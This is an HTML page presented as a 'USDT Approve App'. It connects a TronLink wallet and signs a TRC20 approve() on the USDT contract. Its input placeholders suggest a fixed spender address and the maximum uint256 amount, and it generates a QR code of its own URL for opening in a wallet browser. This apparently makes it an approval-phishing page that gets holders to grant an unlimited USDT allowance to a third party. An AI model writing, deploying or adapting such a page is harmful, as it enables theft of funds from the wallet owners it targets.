<!doctype html>
<html lang="ro">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>USDT Approve App</title>

  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: system-ui, -apple-system, Arial;
    }

    body {
      height: 100vh;
      background: #0b1220;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    /* APP CONTAINER */
    .app {
      width: 100%;
      max-width: 420px;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: #111a2e;
      padding: 20px;
      border-radius: 18px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
    }

    h2 {
      text-align: center;
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border-radius: 10px;
      border: none;
      outline: none;
      background: #1b2a4a;
      color: white;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      border-radius: 10px;
      border: none;
      cursor: pointer;
      font-weight: bold;
    }

    .primary {
      background: #3b82f6;
      color: white;
    }

    .secondary {
      background: #22c55e;
      color: white;
    }

    #status {
      margin-top: 15px;
      font-size: 13px;
      color: #7dd3fc;
      white-space: pre-wrap;
      text-align: center;
    }

    #qrcode {
      margin-top: 15px;
      display: flex;
      justify-content: center;
    }

    .title {
      text-align: center;
      font-size: 18px;
      margin-bottom: 10px;
      opacity: 0.8;
    }
  </style>
</head>

<body>

<div class="app">

  <div class="card">

    <div class="title">TRC20 APPROVE APP</div>
    <h2>USDT Approval</h2>

    <button class="primary" onclick="connectWallet()">Connect Wallet</button>

    <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
    <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />

    <button class="secondary" onclick="approveUSDT()">Confirm & Sign</button>

    <div id="status">Status: waiting...</div>

    <div id="qrcode"></div>

  </div>

</div>

<script>
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
let userAddress = null;

/* WALLET DETECT */
async function detectWallet() {
  let tries = 0;

  const interval = setInterval(() => {
    tries++;

    if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
      userAddress = window.tronWeb.defaultAddress.base58;

      document.getElementById("status").innerText =
        "Wallet detectat:\n" + userAddress;

      clearInterval(interval);
      return;
    }

    if (tries > 20) {
      document.getElementById("status").innerText =
        "Deschide în TronLink dApp browser.";
      clearInterval(interval);
    }

  }, 500);
}

/* CONNECT */
async function connectWallet() {
  if (!window.tronWeb) {
    document.getElementById("status").innerText = "TronLink nu este disponibil";
    return;
  }

  await window.tronLink.request({ method: "tron_requestAccounts" });

  userAddress = window.tronWeb.defaultAddress.base58;

  document.getElementById("status").innerText =
    "Connected:\n" + userAddress;
}

/* APPROVE */
async function approveUSDT() {
  try {
    if (!userAddress) {
      alert("Connect wallet first");
      return;
    }

    const spender = document.getElementById("spender").value;
    const amount = document.getElementById("amount").value;

    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);

    const amountInSun = window.tronWeb.toSun(amount);

    const tx = await contract.approve(
      spender,
      amountInSun
    ).send();

    document.getElementById("status").innerText =
      "Approved!\nTX:\n" + tx;

  } catch (e) {
    document.getElementById("status").innerText = e.message;
  }
}

/* QR */
function generateQR() {
  new QRCode(document.getElementById("qrcode"), {
    text: window.location.href,
    width: 140,
    height: 140
  });
}

/* INIT */
window.addEventListener("load", () => {
  detectWallet();
  generateQR();
});
</script>

</body>
</html>
